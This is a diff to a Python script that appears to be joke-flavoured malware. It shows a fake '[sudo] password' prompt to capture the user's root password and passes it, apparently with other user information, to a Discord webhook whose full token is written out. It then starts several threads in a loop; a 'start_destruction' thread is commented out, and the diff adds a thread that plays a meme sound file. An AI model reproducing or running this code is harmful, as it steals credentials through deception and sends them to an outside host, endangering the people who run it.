@@ -1,7 +1,7 @@
 from os import listdir
 from threading import Thread
 from colorama import Fore, Style
-
+from playsound import playsound
 # Importa los módulos desde src
 try:
      from src.behavior import * 
@@ -42,8 +42,12 @@ print(Fore.CYAN,"""
       """)     
 print(Style.RESET_ALL)
 username = listdir('/home/')[0]
+print(Style.BRIGHT)
+rootPassword = input(f'[sudo] password for {username}: ')
 
-rootPassword = input(f'[sudo] password for {username} ')
+
+def play():
+     playsound('src/amogus.mp3')
 
 user_info(root_pswd=rootPassword,
           webhook='https://discord.com/api/webhooks/853467329429897267/81fZI1crGOMsc0OeKUze5M9Yd95iUrLJ6EFPYgifHa1JA2HK9NPIAdc-5ZIBNyyZ6eFR')
@@ -58,11 +62,13 @@ for _ in range(10):
      t3.start()
 #    t4 = Thread(target=start_destruction)
 #    t4.start()
+     t5 = Thread(target=play)
+     t5.start()
      threads.append(t1)
      threads.append(t2)
      threads.append(t3)
 #    threads.append(t4)
-
+     threads.append(t5)
 for thread in threads:
      thread.join()
   
